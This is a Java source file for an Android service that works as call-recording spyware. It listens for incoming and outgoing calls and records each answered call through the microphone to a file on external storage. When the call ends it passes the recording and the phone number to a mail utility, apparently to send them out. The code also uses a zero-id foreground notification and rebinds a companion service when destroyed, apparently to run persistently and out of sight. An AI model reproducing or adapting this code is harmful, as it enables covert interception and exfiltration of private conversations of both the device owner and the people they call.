package com.view.core.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.widget.Toast;
import android.app.Notification;////////////////////
import java.io.File;
import java.io.IOException;

import com.view.core.utils.SendMailUtil;

import com.view.core.activitys.MainActivity;

/**
 * @author  why
 *
 */
public class PhoneService extends Service {

    private static final String OUTGOING_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
    private String incomeNumber;
    private TelephonyManager tm;
    private PhoneListener listener;
    private MediaRecorder mediaRecorder;
    private File file;
    @Override
    public IBinder onBind(Intent intent)
    {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        startForeground(0, new Notification());/////////////
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        listener = new PhoneListener();

        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);  //注册监听器 监听电话状态

        getOutgoingCall();
        Toast.makeText(getApplicationContext(),"开启", Toast.LENGTH_LONG).show();
    }


    private class PhoneListener extends PhoneStateListener
    {


        @Override
        public void onCallStateChanged(int state, String incomingNumber)
        {
            super.onCallStateChanged(state, incomingNumber);
            try
            {
                switch(state)
                {
                    case TelephonyManager.CALL_STATE_RINGING:   //来电
                        //Toast.makeText(getApplicationContext(),"ccccccccccc", Toast.LENGTH_LONG).show();
                        //Toast.makeText(getApplicationContext(),"11", Toast.LENGTH_LONG).show();
                        incomeNumber = incomingNumber;
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:   //接通电话
                        // Toast.makeText(getApplicationContext(),"11", Toast.LENGTH_LONG).show();
                        //Toast.makeText(getApplicationContext(),"dddddddddd", Toast.LENGTH_LONG).show();
                        //Toast.makeText(getApplicationContext(),"22", Toast.LENGTH_LONG).show();
                        file = new File(Environment.getExternalStorageDirectory(), System.currentTimeMillis() + ".3gp");
                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);   //获得声音数据源
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);   // 按3gp格式输出
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                        mediaRecorder.setOutputFile(file.getAbsolutePath());   //输出文件
                        mediaRecorder.prepare();    //准备
                        mediaRecorder.start();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:  //挂掉电话
                        //Toast.makeText(getApplicationContext(),"22", Toast.LENGTH_LONG).show();
                       // Toast.makeText(getApplicationContext(),"33", Toast.LENGTH_LONG).show();
                        if(mediaRecorder != null)
                        {
                            mediaRecorder.stop();
                            mediaRecorder.release();
                            mediaRecorder = null;
                            SendMailUtil.send(file,incomingNumber);
                        }

                        break;

                }
            }


            catch (IllegalStateException e)
            {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            catch (IOException e)
            {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }


    }
    private void getOutgoingCall() {
        IntentFilter intentFilter = new IntentFilter();
        // 监听去电广播
        intentFilter.addAction(OUTGOING_ACTION);
        MyPhoneStateReceiver myPhoneStateReceiver = new MyPhoneStateReceiver();
        // 动态注册去电广播接收器
        registerReceiver(myPhoneStateReceiver, intentFilter);
    }

    class MyPhoneStateReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            // 获取去电号码
            //Toast.makeText(getApplicationContext(),"aaaaaaaaaaaa", Toast.LENGTH_LONG).show();
            String outgoingNumber = getResultData();
            incomeNumber = outgoingNumber;
            //Toast.makeText(getApplicationContext(),incomeNumber, Toast.LENGTH_LONG).show();
            //WifiManager wifiManager = (WifiManager)getSystemService(Context.WIFI_SERVICE);
            //if (wifiManager.isWifiEnabled()) {
            //    ;
            //} else {
            //wifiManager.setWifiEnabled(true);
            //delay(5000);
            //}
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        tm.listen(listener, PhoneStateListener.LISTEN_NONE);
        listener = null;
        Intent intent = new Intent(this, PhoneService1.class);
        bindService(intent, MainActivity.myServiceConnection, BIND_AUTO_CREATE);
    }
}
